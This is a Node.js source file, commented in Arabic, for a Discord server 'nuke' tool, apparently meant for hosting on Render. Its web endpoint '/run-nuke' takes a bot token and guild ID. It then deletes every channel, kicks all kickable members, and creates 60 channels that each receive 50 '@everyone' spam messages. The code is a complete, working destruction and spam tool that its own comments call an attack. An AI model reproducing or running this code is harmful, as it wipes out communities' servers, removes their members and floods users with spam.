const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(express.static('.'));

// تشغيل الواجهة
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// استقبال أمر الهجوم من الموقع
app.post('/run-nuke', async (req, res) => {
    const { token, guildId, roomName, message, delChannels, kickMembers } = req.body;

    // تفعيل كافة الصلاحيات (Intents) لضمان عمل البوت
    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages
        ] 
    });

    client.on('ready', async () => {
        console.log(`[V5] البوت جاهز: ${client.user.tag}`);
        const guild = client.guilds.cache.get(guildId);

        if (!guild) {
            console.log("السيرفر غير موجود أو البوت ليس فيه.");
            return;
        }

        try {
            // 1. حذف الرومات (بالتوازي لسرعة V5)
            if (delChannels) {
                const deleteTasks = guild.channels.cache.map(ch => ch.delete().catch(() => {}));
                await Promise.all(deleteTasks);
            }

            // 2. طرد الأعضاء
            if (kickMembers) {
                guild.members.cache.forEach(m => {
                    if (m.kickable) m.kick("Tools 2399 Pr V5").catch(() => {});
                });
            }

            // 3. إنشاء الرومات والسبام (60 روم دفعة واحدة)
            for (let i = 0; i < 60; i++) {
                guild.channels.create({ 
                    name: roomName || "nuked-by-lord",
                    type: 0 // Text Channel
                }).then(channel => {
                    // إرسال 50 رسالة سبام في كل روم
                    for (let j = 0; j < 50; j++) {
                        channel.send(message || "@everyone V5 HERE").catch(() => {});
                    }
                }).catch(() => {});
            }

            console.log("تم تنفيذ العملية بنجاح.");
        } catch (err) {
            console.error("خطأ في التنفيذ:", err);
        }
    });

    client.login(token).catch(err => {
        console.log("التوكن غير صحيح أو انتهت صلاحيته.");
    });

    res.json({ status: "success", msg: "تم بدء الهجوم بنجاح V5" });
});

// تشغيل السيرفر على بورت 3000 لـ Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الموقع يعمل على البورت: ${PORT}`);
});
